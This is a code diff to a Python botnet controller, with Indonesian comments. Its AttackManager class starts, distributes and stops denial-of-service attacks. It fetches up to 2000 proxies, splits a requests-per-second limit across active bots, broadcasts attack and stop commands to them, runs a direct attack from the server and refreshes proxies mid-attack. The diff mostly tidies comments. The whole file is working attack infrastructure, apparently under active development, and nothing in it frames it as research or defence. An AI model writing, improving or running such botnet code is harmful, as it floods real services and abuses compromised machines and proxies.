@@ -35,7 +35,6 @@ class AttackManager:
     async def start_attack(self, req: AttackRequest) -> str:
         """
         Start serangan baru dengan PROXY AUTO-ATTACH ke bot.
-        Synchronized dengan botnet_manager.broadcast_attack_with_proxies()
         """
         # Cek concurrent
         async with self._lock:
@@ -64,10 +63,10 @@ class AttackManager:
 
         await self._save_attack_to_redis(attack)
 
-        # ---- BACA RPS LIMIT ----
+        # BACA RPS LIMIT
         rps_limit = await self._get_rps_limit()
 
-        # ---- GET PROXIES DARI POOL ----
+        # GET PROXIES DARI POOL
         proxies = await proxy_manager.get_mixed_proxies(count=2000)
         if not proxies:
             logger.warning("[ATTACK] No proxies in pool! Running emergency refresh...")
@@ -77,7 +76,7 @@ class AttackManager:
         proxy_count = len(proxies)
         logger.info(f"[ATTACK] Fetched {proxy_count} proxies from pool")
 
-        # ---- GET BOT COUNT ----
+        # GET BOT COUNT
         bot_ids = await botnet_manager.get_active_bot_ids()
         bot_count = len(bot_ids)
 
@@ -91,8 +90,7 @@ class AttackManager:
                 rps_per_bot = 0
             logger.info(f"📊 Distribution: {rps_limit} RPS / {bot_count} bots = {rps_per_bot} RPS/bot | {proxy_count} proxies")
 
-        # ---- FIX: Gunakan botnet_manager.broadcast_attack_with_proxies() ----
-        # Ini yang bikin semua sinkron — proxy di-distribute oleh botnet_manager
+        # Gunakan botnet_manager.broadcast_attack_with_proxies() untuk distribute proxy ke semua bot
         if bot_count > 0 and proxies:
             attack_data = {
                 "attack_id": attack_id,
@@ -105,11 +103,10 @@ class AttackManager:
                 "extra": "",
             }
 
-            # Panggil botnet_manager untuk distribute proxy ke semua bot
             result = await botnet_manager.broadcast_attack_with_proxies(attack_data, proxies)
             logger.info(f"📡 Botnet broadcast result: {result}")
         elif bot_count > 0:
-            # No proxies — send attack without (bot will warn)
+            # No proxies — send attack without
             for bot_id in bot_ids:
                 asyncio.create_task(
                     botnet_manager.send_to_bot(bot_id, {
@@ -126,11 +123,11 @@ class AttackManager:
                 )
             logger.warning(f"📡 Sent attack to {bot_count} bots WITHOUT proxies!")
 
-        # ---- Jalankan direct attack dari server ----
+        # Jalankan direct attack dari server
         task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit, proxies))
         self.attack_tasks[attack_id] = task
 
-        # ---- Start mid-attack proxy refresh kalo attack > 5 menit ----
+        # Start mid-attack proxy refresh kalo attack > 5 menit
         if req.duration > 300:
             asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))
 
@@ -170,7 +167,6 @@ class AttackManager:
                     logger.warning(f"[REFRESH] No fresh proxies for {attack_id}")
                     continue
 
-                # Gunakan botnet_manager untuk broadcast refresh
                 result = await botnet_manager.broadcast_proxy_refresh(attack_id, fresh_proxies)
                 logger.info(f"[REFRESH] Attack {attack_id} refreshed #{i+1}: {result}")
 
@@ -193,12 +189,11 @@ class AttackManager:
 
         await self._remove_attack_from_redis(attack_id)
 
-        asyncio.create_task(
-            botnet_manager.broadcast_command({
-                "cmd": "stop",
-                "attack_id": attack_id
-            })
-        )
+        # FIXED: Broadcast stop dengan proper command format
+        await botnet_manager.broadcast_command({
+            "cmd": "stop",
+            "attack_id": attack_id
+        })
 
         if attack:
             avg_rps = attack.total_requests // max(1, attack.duration)
